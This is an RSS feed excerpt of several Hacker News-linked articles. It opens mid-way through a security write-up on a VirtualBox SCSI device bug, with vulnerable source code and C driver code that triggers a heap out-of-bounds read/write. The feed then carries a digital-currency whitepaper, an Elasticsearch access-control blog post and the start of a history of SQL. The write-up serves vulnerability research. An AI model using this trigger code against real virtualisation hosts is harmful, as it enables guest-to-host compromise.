</code></pre><p>The <code>SCSI</code> device implements a simple state machine with a global heap allocated buffer. When initiating the state machine, we can set the buffer size and the state machine will set a global buffer pointer to point to the start of said buffer. From there on, we can either read one or more bytes, or write one or more bytes. Every read/write operation will advance the buffer pointer. This means that after reading a byte from the buffer, we can’t write that same byte and vice versa, because the buffer pointer has already been advanced.</p><p>While auditing the <code>vboxscsiReadString</code> function, <a href="https://twitter.com/_tsuro">tsuro</a> and <a href="https://twitter.com/__spq__">spq</a> found something interesting:</p><pre><code><span>// src/VBox/Devices/Storage/VBoxSCSI.cpp</span>

<span>/**
 * @retval VINF_SUCCESS
 */</span>
<span>int</span> vboxscsiReadString(PPDMDEVINS pDevIns, PVBOXSCSI pVBoxSCSI, <span>uint8_t</span> iRegister,
                       <span>uint8_t</span> <span>*</span>pbDst, <span>uint32_t</span> <span>*</span>pcTransfers, <span>unsigned</span> cb)
{
    RT_NOREF(pDevIns);
    LogFlowFunc((<span>"pDevIns=%#p pVBoxSCSI=%#p iRegister=%d cTransfers=%u cb=%u</span><span>\n</span><span>"</span>,
                 pDevIns, pVBoxSCSI, iRegister, <span>*</span>pcTransfers, cb));

    <span>/*
     * Check preconditions, fall back to non-string I/O handler.
     */</span>
    Assert(<span>*</span>pcTransfers <span>&gt;</span> <span>0</span>);

    <span>/* Read string only valid for data in register. */</span>
    AssertMsgReturn(iRegister <span>==</span> <span>1</span>, (<span>"Hey! Only register 1 can be read from with string!</span><span>\n</span><span>"</span>), VINF_SUCCESS);

    <span>/* Accesses without a valid buffer will be ignored. */</span>
    AssertReturn(pVBoxSCSI<span>-&gt;</span>pbBuf, VINF_SUCCESS);

    <span>/* Check state. */</span>
    AssertReturn(pVBoxSCSI<span>-&gt;</span>enmState <span>==</span> VBOXSCSISTATE_COMMAND_READY, VINF_SUCCESS);
    Assert(<span>!</span>pVBoxSCSI<span>-&gt;</span>fBusy);

    RTCritSectEnter(<span>&amp;</span>pVBoxSCSI<span>-&gt;</span>CritSect);
    <span>/*
     * Also ignore attempts to read more data than is available.
     */</span>
    <span>uint32_t</span> cbTransfer <span>=</span> <span>*</span>pcTransfers <span>*</span> cb;
    <span>if</span> (pVBoxSCSI<span>-&gt;</span>cbBufLeft <span>&gt;</span> <span>0</span>)
    {
        Assert(cbTransfer <span>&lt;=</span> pVBoxSCSI<span>-&gt;</span>cbBuf);     <span>// --- [1] ---</span>
        <span>if</span> (cbTransfer <span>&gt;</span> pVBoxSCSI<span>-&gt;</span>cbBuf)
        {
            memset(pbDst <span>+</span> pVBoxSCSI<span>-&gt;</span>cbBuf, <span>0xff</span>, cbTransfer <span>-</span> pVBoxSCSI<span>-&gt;</span>cbBuf);
            cbTransfer <span>=</span> pVBoxSCSI<span>-&gt;</span>cbBuf;  <span>/* Ignore excess data (not supposed to happen). */</span>
        }

        <span>/* Copy the data and adance the buffer position. */</span>
        memcpy(pbDst, 
               pVBoxSCSI<span>-&gt;</span>pbBuf <span>+</span> pVBoxSCSI<span>-&gt;</span>iBuf,  <span>// --- [2] ---</span>
               cbTransfer);

        <span>/* Advance current buffer position. */</span>
        pVBoxSCSI<span>-&gt;</span>iBuf      <span>+=</span> cbTransfer;
        pVBoxSCSI<span>-&gt;</span>cbBufLeft <span>-=</span> cbTransfer;         <span>// --- [3] ---</span>

        <span>/* When the guest reads the last byte from the data in buffer, clear
           everything and reset command buffer. */</span>

        <span>if</span> (pVBoxSCSI<span>-&gt;</span>cbBufLeft <span>==</span> <span>0</span>)              <span>// --- [4] ---</span>
            vboxscsiReset(pVBoxSCSI, <span>false</span> <span>/*fEverything*/</span>);
    }
    <span>else</span>
    {
        AssertFailed();
        memset(pbDst, <span>0</span>, cbTransfer);
    }
    <span>*</span>pcTransfers <span>=</span> <span>0</span>;
    RTCritSectLeave(<span>&amp;</span>pVBoxSCSI<span>-&gt;</span>CritSect);

    <span>return</span> VINF_SUCCESS;
}
</code></pre><p>We can fully control <code>cbTransfer</code> in this function. The function initially makes sure that we’re not trying to read more than the buffer size <code>[1]</code>. Then, it copies <code>cbTransfer</code> bytes from the global buffer into another buffer <code>[2]</code>, which will be sent to the guest driver. Finally, <code>cbTransfer</code> bytes get subtracted from the remaining size of the buffer <code>[3]</code> and if that remaining size hits zero, it will reset the SCSI device and require the user to reinitiate the machine state, before reading any more bytes.</p><p>So much for the logic, but what’s the issue here? There is a check at <code>[1]</code> that ensures no single read operation reads more than the buffer’s size. But this is the wrong check. It should verify, that no single read can read more than the buffer <strong>has left</strong>. Let’s say we allocate a buffer with a size of 40 bytes. Now we call this function to read 39 bytes. This will advance the buffer pointer to point to the 40th byte. Now we call the function again and tell it to read 2 more bytes. The check in <code>[1]</code> won’t bail out, since 2 is less than the buffer size of 40, however we will have read 41 bytes in total. Additionally, this will cause the subtraction in <code>[3]</code> to underflow and <code>cbBufLeft</code> will be set to <code>UINT32_MAX-1</code>. This same <code>cbBufLeft</code> will be checked when doing write operations and since it is very large now, we’ll be able to also write bytes that are outside of our buffer.</p><h2 id="getting-oob-readwrite"> <a href="#getting-oob-readwrite">Getting OOB read/write</a></h2><p>We understand the vulnerability, so it’s time to develop a driver to exploit it. Ironically enough, the “getting a driver to build” part was actually one of the hardest (and most annoying) parts of the exploit development. <a href="https://twitter.com/fktio">malle</a> got to building VirtualBox from source in order for us to have symbols and a debuggable process while <a href="https://twitter.com/0x4d5aC">0x4d5a</a> came up with the idea of using the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HEVD</a> driver as a base for us to work with, since it does some similar things to what we need. Now let’s finally start writing some code.</p><p>Here’s how we triggered the bug:</p><pre><code><span>void</span> exploit() {
    <span>static</span> <span>const</span> <span>uint8_t</span> cdb[<span>1</span>] <span>=</span> {<span>0</span>};
    <span>static</span> <span>const</span> <span>short</span> port <span>=</span> <span>0x434</span>;
    <span>static</span> <span>const</span> <span>uint32_t</span> buffer_size <span>=</span> <span>1024</span>;

    <span>// reset the state machine</span>
    __outbyte(port<span>+</span><span>3</span>, <span>0</span>);

    <span>// initiate a write operation</span>
    __outbyte(port<span>+</span><span>0</span>, <span>0</span>); <span>// TargetDevice (0)</span>
    __outbyte(port<span>+</span><span>0</span>, <span>1</span>); <span>// direction (to device)</span>
    
    __outbyte(port<span>+</span><span>0</span>, ((buffer_size <span>&gt;&gt;</span> <span>12</span>) <span>&amp;</span> <span>0xf0</span>) <span>|</span> (<span>sizeof</span>(cdb) <span>&amp;</span> <span>0xf</span>)); <span>// buffer length hi &amp; cdb length</span>
    __outbyte(port<span>+</span><span>0</span>, buffer_size);                                        <span>// bugger length low</span>
    __outbyte(port<span>+</span><span>0</span>, buffer_size <span>&gt;&gt;</span> <span>8</span>);                                   <span>// buffer length mid</span>
    
    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>sizeof</span>(cdb); i<span>++</span>)
        __outbyte(port<span>+</span><span>0</span>, cdb[i]);


    <span>// move the buffer pointer to 8 byte after the buffer and the remaining bytes to -8</span>
    <span>char</span> buf[buffer_size];
    __inbytestring(port<span>+</span><span>1</span>, buf, buffer_size <span>-</span> <span>1</span>)    <span>// Read bufsize-1</span>
    __inbytestring(port<span>+</span><span>1</span>, buf, <span>9</span>)                  <span>// Read 9 more bytes</span>

    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>sizeof</span>(buf); i <span>+=</span> <span>4</span>)
        <span>*</span>((<span>uint32_t</span><span>*</span>)(<span>&amp;</span>buf[i])) <span>=</span> <span>0xdeadbeef</span>
    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>10000</span>; i<span>++</span>)
        __outbytestring(port<span>+</span><span>1</span>, buf, <span>sizeof</span>(buf))
}

</code></pre><p>The driver first has to initiate the <code>SCSI</code> state machine with a <code>bufsize</code>. Then we read <code>bufsize-1</code> bytes and then we read 9 bytes. We chose 9 instead of 2 byte in order to have the buffer pointer 8 byte aligned after the overflow. Finally, we overwrite the next 10000kb after our allocated <code>buffer+8</code> with <code>0xdeadbeef</code>.</p><p>After loading this driver in the win7 guest, this is what we get: <img src="https://secret.club/assets/sauercl0ud/VM-aborted.png" alt=""></p><p>As expected, the VM crashes because we corrupted the heap. Now we know that our OOB read/write works and since working with drivers was annoying, we decided to modify the driver one last time to expose the vulnerability to user-space. The driver was modified to accept this <code>Req</code> struct via an <code>IOCTL</code>:</p><pre><code><span>enum</span> operations {
    OPERATION_OUTBYTE <span>=</span> <span>0</span>,
    OPERATION_INBYTE <span>=</span> <span>1</span>,
    OPERATION_OUTSTR <span>=</span> <span>2</span>,
    OPERATION_INSTR <span>=</span> <span>3</span>,
};

<span>typedef</span> <span>struct</span> {
    <span>volatile</span> <span>unsigned</span> <span>int</span> port;
    <span>volatile</span> <span>unsigned</span> <span>int</span> operation;
    <span>volatile</span> <span>unsigned</span> <span>int</span> data_byte_out;
} Req;
</code></pre><p>This enables us to use the driver as a bridge to communicate with the <code>SCSI</code> device from any user-space program. This makes exploit prototyping a whole lot faster and has the added benefit of removing the need to touch Windows drivers ever again (well, for the rest of this exploit anyway :D).</p><p>The bug gives us a liner heap OOB read/write primitive. Our goal is to get from here to arbitrary code execution so let’s put this bug to use!</p><h2 id="leaking-vboxcdll-and-heap-addresses"> <a href="#leaking-vboxcdll-and-heap-addresses">Leaking <code>vboxc.dll</code> and heap addresses</a></h2><p>We’re able to dump heap data using our OOB read but we’re still far from code execution. This is a good point to start …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://secret.club/2021/01/14/vbox-escape.html">https://secret.club/2021/01/14/vbox-escape.html</a></em></p>]]>
            </description>
            <link>https://secret.club/2021/01/14/vbox-escape.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25795731</guid>
            <pubDate>Fri, 15 Jan 2021 20:13:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Digital currency where the money supply is based on participation]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25795697">thread link</a>) | @nealbozeman
<br/>
January 15, 2021 | https://nealbozeman.com/chances-whitepaper | <a href="https://web.archive.org/web/*/https://nealbozeman.com/chances-whitepaper">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-326">
	<!-- .entry-header -->

	
	<div>
		
<p><strong>Abstract</strong>: To the question, “what features would make for an ideal, highly transactable, universally adopted digital currency?” we explore major limitations with existing cryptocurrencies and propose a digital money called CHANCES.</p>



<h2>What is the ideal currency?</h2>



<p>The ideal currency would have stable prices, an elastic and predictable money supply, no transaction costs, and be widely obtainable by participants in any economy. We consider the relationships between wealth, assets, and money, and propose CHANCES as a better currency than traditional fiat and cryptos, and we take full advantage of an all digital currency.</p>



<h2>CHANCES…</h2>



<p>… pegs the money supply to the total number of verified participants.</p>



<p>… gives 1.000.000 (one-million) c$ to every new verified participant</p>



<p>… allows one and only one authentic registration (participants cannot sign up more than once)</p>



<p>… continuously replenishes verified accounts below 1.000.000 c$ (without inflating money supply, at up to 10.000 c$ monthly)</p>



<p>… slowly draws money from accounts over 1.000.000 c$ (at a rate of less than 1% per month)</p>



<p>… has no transaction fees, no miners, can reverse fraudulent transactions, and insure deposits.</p>



<h2>Why?</h2>



<p>Money is in all ways relative. It is not wealth, in and of itself, so what is it?</p>



<p>CHANCES supposes that in modern, western economies, which are roughly 2/3rds service based, money mainly represents economic potential, such as the ability to command someone’s attention to perform labor or a service or to create something to be consumed. CHANCES explicitly draws on this connection by supposing that 1.) the money supply represents the total economic potential of all participants in an economy, 2.) that a unit of money represents some portion of potential thereof, and 3.) since the economic value is different between each participant, the function of the marketplace is to continuously discover these relative values and adjust money flows (income and prices) proportionately. For example, a doctor might be paid more than a car mechanic, which is what the marketplace participants are free to discover.</p>



<p>CHANCES looks at money as economic potential, and considers that it must be replenished continuously through the economy and that high participation optimizes choice and competition in a marketplace.</p>



<p>We suppose that the initial allotment of 1.000.000 c$ is approximately 8.5 years of average potential economic value of any random individual. Initial allotments help produce new capital pools to be used in organized endeavors within the economy and can be used to expand money supply through through lending and borrowing.</p>



<p>10.000 c$ is distributed to all identity-verified accounts monthly to replenish participation capability in the economy, and proves each verified participant credit worthy. This distribution is funded by simultaneously drawing 1% monthly from all account balances. This has the following effect on verified account balances:</p>



<figure><table><tbody><tr><td><strong>Starting balance</strong></td><td><strong>Monthly change</strong></td></tr><tr><td>0</td><td>+ 10.000 c$</td></tr><tr><td>500.000</td><td>+ 5.000 c$</td></tr><tr><td>1.000.000</td><td>no change</td></tr><tr><td>1.500.000</td><td>– 5.000 c$</td></tr><tr><td>2.000.000</td><td>– 10.000 c$</td></tr></tbody></table></figure>



<p>Unverified and anonymous accounts may exist, however, they are not given an initial allotment and do not receive any monthly benefit. Additionally, they are still subject to the 1% universal draw-down and they do not affect the base money supply.</p>



<h2><strong>Money supply</strong></h2>



<p>Pegging money supply to number of verified participants (benefactors) is a novel way to to keep prices stable while encouraging the network to grow. There is no hold and wait incentive that shows up in traditional cryptocurrencies, and there is no late-adopter penalty where people who come in later pay more to enter.</p>



<p>The following shows the relationship between verified participants and the money supply. </p>



<figure><table><tbody><tr><td><strong>Accounts</strong></td><td><strong>Base Money Supply (in millions)</strong></td><td><strong>Relative Value</strong></td></tr><tr><td>1 verified account<br>1 wallet</td><td>1 c$</td><td>1</td></tr><tr><td>1 verified account<br>100 wallets</td><td>1 c$</td><td>1</td></tr><tr><td>1000 verified accounts<br>10.952 wallets</td><td>1.000 c$</td><td>1</td></tr><tr><td>365.000.000 verified accounts<br>1bln wallets</td><td>365.000.000 c$</td><td>1</td></tr><tr><td>8 bln verified accounts<br>100 bln wallets</td><td>8.000.000.000 c$</td><td>1</td></tr></tbody></table></figure>



<p>Operating and maintaining this public, not for profit network will require overhead. We propose that internal accounts will be created and tied exclusively to a CHANCES Foundation. These accounts will be listed publicly and used to spend money on the network to cover operational costs which will also be publicly posted. Internally used accounts will be subject to the same 1% draw and replenishment rules. </p>



<h2>Features of Chances</h2>



<figure><table><tbody><tr><td></td><td><strong>Chances</strong></td><td><strong>Bitcoin</strong></td></tr><tr><td>Centralized</td><td>Yes</td><td>No</td></tr><tr><td>Reversible Transactions</td><td>Yes</td><td>No</td></tr><tr><td>Transaction fees</td><td>None</td><td>Variable/high</td></tr><tr><td>Transaction speed</td><td>Immediate</td><td>*1 hour+</td></tr><tr><td>Deposit insurance</td><td>Yes</td><td>No</td></tr><tr><td>Privacy</td><td>Yes</td><td>No</td></tr><tr><td>Anonymity</td><td>No</td><td>**No</td></tr><tr><td>Money supply</td><td>Elastic</td><td>Constrained</td></tr><tr><td>Price volatility</td><td>Stable</td><td>Volatile</td></tr><tr><td>Transactability</td><td>High</td><td>Low</td></tr><tr><td>Low energy consumption</td><td>Yes</td><td>No</td></tr><tr><td>Cryptographically secure</td><td>Yes</td><td>Yes</td></tr><tr><td>Meaningful</td><td>Yes</td><td>No</td></tr><tr><td>Incentive to spend</td><td>Yes</td><td>No</td></tr></tbody></table><figcaption>* Variable <br>** Functionally, not anonymous.</figcaption></figure>



<h2>Privacy &amp; anonymity</h2>



<p>Anonymity is the ability to transact without exposing identifying information to any counter-party or 3rd-party. Privacy is a degree of protection from having your transactions disclosed to a 3rd-party.</p>



<p>Cryptocoins, although transactionally secure, offer no anonymity above and beyond existing methods available to all forms of money, such as obfuscation through legal entities, or bank mixing schemes, and indeed, they decrease privacy as every transaction is publicly recorded. One need only know some number of wallet locations and their benefactors in order to reveal a detailed picture of participants. </p>



<p><strong>Primary exposure points include:</strong></p>



<ul><li>Exchanging into crypto at market through an exchange.</li><li>Establishing “mining” setups while paying for them with non-crypto currency.</li><li>Behavioral analysis, by tracking the flow of transactions and their timings to deduce whom has transacted.</li><li>Use of third party wallets.</li></ul>



<p>Truly, in any mode of exchange, some level of personal detail is exposed, and any transaction can only be undertaken if the benefits outweigh the risk of exposure. Many transactions indeed benefit from knowing the counter party to the transaction, such as when using bank cards and 3rd party payment processors to create safe and trustworthy shopping environments. </p>



<p>Although not anonymous, typical banking laws in OECD countries offer superior privacy to distributed ledger based crypto currencies. True anonymity for a widely adopted currency seems neither possible nor practical, and we instead take a view towards privacy in establishing the framework for Chances.</p>



<h2>Distributed ledgers</h2>



<p>Given that distributed ledgers do not protect privacy, we do not intend to implement them for CHANCES. We expect to use a cryptographically secure, private ledger than can be audited without disclosing user information.</p>



<h2>Why has nobody adopted crypto for transacting?</h2>



<p>Please see a break-out of this discussion. <a href="https://nealbozeman.com/crypto-adoption" data-type="post" data-id="368">Why cryptocoins have not been adopted by the marketplace</a></p>



<h2>Resources</h2>



<figure><p>
https://bitcoin.org/bitcoin.pdf
</p></figure>
<p><span></span>
				<span>Post Views: </span>
				<span>470</span>
			</p>	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://nealbozeman.com/chances-whitepaper</link>
            <guid isPermaLink="false">hacker-news-small-sites-25795697</guid>
            <pubDate>Fri, 15 Jan 2021 20:11:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elasticsearch is dead, long live Open Distro for Elasticsearch]]>
            </title>
            <description>
<![CDATA[
Score 95 | Comments 54 (<a href="https://news.ycombinator.com/item?id=25794987">thread link</a>) | @nathaliaariza
<br/>
January 15, 2021 | https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch | <a href="https://web.archive.org/web/*/https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><p>TLDR<strong>: </strong>The need for an open-source alternative to Elasticsearch has recently become more evident; platforms that bundle Open Distro for Elasticsearch are able to future-proof open-source support for free-text search and Elasticsearch. In this post, we describe how Hopsworks leverages the authentication and authorization support in Open Distro for Elasticsearch to make free text search a project-based multi-tenant service in Hopsworks. More concretely, Hopsworks now supports dynamic <a href="https://en.wikipedia.org/wiki/Role-based_access_control#:~:text=Role%2Dbased%20access%20control%20(RBAC)%20is%20a%20policy%2D,simple%20to%20perform%20user%20assignments.">role-based access control</a> (RBAC) to indexes in elasticsearch with no performance penalty by building on Open Distro for Elasticsearch (ODES).<br></p><p>In January 2021, <a href="https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks">Elastic switched from the Apache V2 open-source license</a> for both Elasticsearch and Kibana to a non open-source license to Server Side Public License (SSPL).</p><p>Hopsworks is an open-source platform that includes Open Distro for Elasticsearch (a fork of Elasticsearch) and Kibana.</p><p>In Hopsworks, we use Elasticsearch to provide free-text search for AI assets (features, models, experiments, datasets, etc). We also make Elasticsearch indexes available for use by programs run in Hopsworks. As we interpret it, the latter functionality means we contravene the licensing terms of the SSPL:</p><blockquote>“If you make the functionality of the Program or a modified version available to third parties as a service... (license conditions apply)”</blockquote><p>‍</p><p>Luckily, we recently made the switch from Elasticsearch to <a href="https://opendistro.github.io/for-elasticsearch/">Open Distro for Elasticsearch</a>, supported by AWS, which is Apache v2 licensed.<br></p><p>Open Distro for Elasticsearch supports Active Directory and LDAP for authentication and authorization. <a href="https://opendistro.github.io/for-elasticsearch-docs/old/0.9.0/docs/security/permissions/">Using the Security plugin</a>, you can use RBAC to control the actions a user can perform. A role defines the cluster operations and index operations a user can perform, including access to indices, and even fine-grained field and document level access. RBAC allows an administrator to define a single security policy and apply it to all members of a department. But individuals may be members of multiple departments, so a user might be given multiple roles. <a href="https://link.springer.com/chapter/10.1007/978-3-540-85776-1_17">With dynamic role-based access control</a> you can change the set of roles a user can hold at a given time. </p><p>For example, if a user is a member of two departments - one for accessing banking data and another one for accessing trading data, with dynamic RBAC, you could restrict the user to only allow her to hold one of those roles at a given time. The policy for deciding which role the user holds could, for example, depend on what VPN (virtual private network) the user is logged in to or what building the user is present in. In effect, dynamic roles would allow the user to hold only one of the roles at a time and sandbox her inside one of the domains - banking or trading. It would prevent her from cross-linking or copying data between the different trading and banking domains.</p><p>Hopsworks implements a dynamic role-based access control model through its project-based multi-tenant security model<strong>. </strong>&nbsp;Every Project has an <strong>owner</strong> with full read-write privileges and zero or more <strong>members</strong>.&nbsp; A project owner may invite other users to his/her project as either a <strong>Data Scientist </strong>(read-only privileges and run jobs privileges) or <strong>Data Owner</strong> (full privileges). Users can be members of (or own) multiple Projects, but inside each project, each member (user) has a unique identity - we call it a <em>project-user identity</em>.&nbsp; For example, user <em>Alice</em> in <em>Project A</em> is different from user <em>Alice </em>in <em>Project B - </em>(in fact, the system-wide (project-user) identities are <strong><em>ProjectA__Alice</em></strong> and <strong><em>ProjectB__Alice</em></strong>, respectively)<em>. </em></p><p><em>‍</em>As such, each project-user identity is effectively a role with the project-level privileges to access data and run programs inside that project. If a user is a member of multiple projects, she has, in effect, multiple possible roles, but only one role can be active at a time when performing an action inside Hopsworks. When a user performs an action (for example, runs a program) it will be executed with the project-user identity. That is, the action will only have the privileges associated with that project. The figure below illustrates how Alice has a different identity for each of the two projects (A and B) that she is a member of. Each project contains its own separate private assets. Alice can use only one identity at a time which guarantees that she can’t access assets from both projects at the same time.</p><p>Hopsworks enables you to host sensitive data in a shared cluster using a <a href="https://www.logicalclocks.com/blog/how-we-secure-your-data-with-hopsworks">project-based access control security model</a> (an implementation of dynamic role-based access control). In Hopsworks, a project is a secure sandbox with members, data, code, and services. Similar to GitHub repositories, projects are self-service: users manage membership, roles, and can securely share data assets with other projects. This <em>project-based multi-tenant security model</em> enables users to host both sensitive and shared data in a single Hopsworks cluster - you do not need to manage and pay for separate clusters.&nbsp;<br></p><figure id="w-node-14452fea4591-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bafe67f9a01f3d5100b3_Screenshot%202021-01-15%20at%2016.54.57.png" loading="lazy" alt=""></p></figure><p>‍</p><p>An important aspect of project-based multi-tenancy is that assets can be shared between projects - sharing does not mean that data is duplicated. The current assets that can be shared between projects are: files/directories in HopsFS, Hive databases, feature stores, and Kafka topics. For example, in the figure below there are three users (User1, User2, and User3)&nbsp; and two projects (A and B). User1 is a member of project A, while User2 and User3 are members of project B. All three users (User1, User2, User3) can access the assets shared between project A and project B. As sharing does not mean copying, the access control rules for the asset are updated to give users in the other project read or write permissions on the shared asset.</p><p>‍<br></p><figure id="w-node-213ef0acf495-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bb182dbe7b79013d5093_Screenshot%202021-01-15%20at%2016.55.17.png" loading="lazy" alt=""></p></figure><p>‍</p><p>P<em>roject-user identity</em> is primarily based on a X.509 certificate issued internally by Hopsworks. Access control policies, however, are implemented by the platform services (HopsFS, Hive, Feature Store, Kafka), and for Elasticsearch Open Distro, permissions are managed using an open-source <a href="https://github.com/logicalclocks/elasticsearch-chef">Hopsworks project-based authorizer plugin</a>.</p><p>The following PySpark code snippet, <a href="https://github.com/logicalclocks/hops-examples/blob/master/notebooks/spark/Elasticsearch-python.ipynb">available as a notebook</a> when you run the Spark Tour on Hopsworks, shows how to read from an index that is private to a project from PySpark. There is also an <a href="https://github.com/logicalclocks/hops-examples/blob/master/notebooks/spark/Elasticsearch-scala.ipynb">equivalent Scala/Spark notebook</a>.</p><p>
    -- CODE language-bash --
from hops import elasticsearch, hdfs 
df = spark.read.option("header","true").csv("hdfs:///Projects/" + hdfs.project_name() + "/Resources/akc_breed_info.csv")

# Write df to the project's private index called 'newindex'
df.write.format('org.elasticsearch.spark.sql').options(**elasticsearch.get_elasticsearch_config("newindex")).mode("Overwrite").save()

# Read from the project's private index called 'newindex'
reader = spark.read.format("org.elasticsearch.spark.sql").options(**elasticsearch.get_elasticsearch_config("newindex"))
df = reader.load().orderBy("breed")
df.show()
</p><figure id="w-node-44c6e7d98db1-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bb89f179d5ce9d7be772_Screenshot%202021-01-15%20at%2016.57.47.png" loading="lazy" alt=""></p></figure><p>‍</p><p>In Hopsworks, we use Public Key Infrastructure (PKI) with X.509 certificates to authenticate and authorize users. Every user and every service in a Hopsworks cluster has a private key and an X.509 certificate. Hopsworks projects also support multi-tenant services that are not currently backed by X.509 certificates, including Elasticsearch. <a href="https://opendistro.github.io/for-elasticsearch/">Open Distro for Elasticsearch</a> supports authentication and access control using JSON Web Tokens (<a href="https://dzone.com/articles/what-is-jwt-token">JWT</a>).&nbsp; Similar to application X.509 certificates, Hopsworks’ resource manager (HopsYARN) issues a JWT for each submitted job and propagates it to running containers. Using the JWT, user code can then securely make calls to Elasticsearch indexes owned by the project. The JWT is rotated automatically before it expires and invalidated by HopsYARN once the application has finished.<br></p><p>For every Hopsworks project, a number of private indexes can be created in Elasticsearch: an index for real-time logs of applications in that project (accessible via Kibana), an index for ML experiments in the project, and an index for provenance for the project’s applications and file operations. Elastic indexes are private to the project - they are not accessible by users that are not members of the project. This access control is implemented as follows: when a request is made on Elasticsearch using a JWT token, our authorizer plugin extracts the project-specific username from the JWT token, which is of the form:<strong><em>‍</em></strong></p><p>‍<strong><em>ProjectA__Alice</em></strong>&nbsp;</p><p>The index names have the following form:</p><p><strong><em>ProjectA__ElasticIndex</em></strong>&nbsp;</p><p>Our plugin checks if a project-specific user is allowed to read/write an index by checking that the prefix (<strong>ProjectA</strong>) of both the user and the index match one another. We plan to add support for sharing elasticsearch indexes between projects by storing a list of projects allowed to perform read and write operations, respectively, on the indexes belonging to a project.</p><h2>X.509 Service certificates</h2><p>In Hopsworks, services communicate with each other using their own certificate to authenticate and encrypt all traffic. Each service in Hopsworks, that supports TLS encryption and/or authentication, has its own service-specific X.509 certificate, including all services in the ELK Stack (Elasticsearch, Kibana, and Logstash). Service certificates contain the Fully Qualified Domain Name (FQDN) of the host they are installed on and the login name of the system user that the process runs as. They are generated when a user provisions Hopsworks, and they have a long lifespan. Service certificates can be rotated automatically in configurable intervals or upon request of the administrator.&nbsp;</p><h2>Securely accessing Elastic Indexes in Jobs on Kubernetes&nbsp;<br></h2><figure id="w-node-d2ae8e066750-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bc186b327c00f6b51384_Screenshot%202021-01-15%20at%2016.59.47.png" loading="lazy" alt=""></p></figure><p>Hopsworks can be integrated with Kubernetes by configuring it to use one of the available authentication mechanisms: API tokens, credentials, certificates, and IAM roles for AWS’ managed EKS offering. Hopsworks can run users’ jobs on Kubernetes that have project-specific security material,&nbsp; X.509 certificates and JWTs, materialized to the launched Pods so user code can securely access services in Hopsworks, such as Open Distro for …</p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch">https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch</a></em></p>]]>
            </description>
            <link>https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794987</guid>
            <pubDate>Fri, 15 Jan 2021 19:17:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What can we learn from SQL's ~50yr success story?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25794929">thread link</a>) | @nutmilk
<br/>
January 15, 2021 | https://blog.arctype.com/sql-50-years/ | <a href="https://web.archive.org/web/*/https://blog.arctype.com/sql-50-years/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <!--kg-card-begin: html--><!--kg-card-end: html--><p>In March 1971, Intel introduced the world's first general microprocessor, the <a href="https://spectrum.ieee.org/tech-history/silicon-revolution/chip-hall-of-fame-intel-4004-microprocessor">Intel 4004</a>. It had ~2,300 transistors and cost $60.</p><p>Fast forward almost 50 years, and the newest iPhone has nearly <strong>12 billion </strong>transistors (but unfortunately costs a little more than $60).</p><p>Many of the programming languages we use today were not introduced until the 90s (Java was introduced in 1996). However, there is one programming language that is still as popular today as it was when it was introduced nearly 50 years ago: <strong>SQL.</strong></p><p>This article will discuss the events that led to the introduction of relational databases, why SQL grew in popularity, and what we can learn from its success.</p><h2 id="table-of-contents">Table of Contents</h2><ol><li><a href="#history-of-early-database-management-ids-and-codasyl">A History of Early Database Management - IDS and CODASYL</a></li><li><a href="#the-network-data-model-better-than-todays-relational-model">The Network Data Model - Better Than Today's Relational Model? </a></li><li><a href="#arrival-of-the-relational-model">Arrival of The Relational Model</a></li><li><a href="#relational-vs-network-data-models">Relational vs. Network Data Models</a></li><li><a href="#the-rise-and-reign-of-sql">The Rise and Reign of SQL</a></li><li><a href="#the-secret-to-sqls-50-year-reign-and-what-we-can-learn">The Secret to SQL’s 50 Year Reign - And What We Can Learn</a></li></ol><!--kg-card-begin: html--><p>
    <h3>Looking for a collaborative SQL Editor?</h3>
    
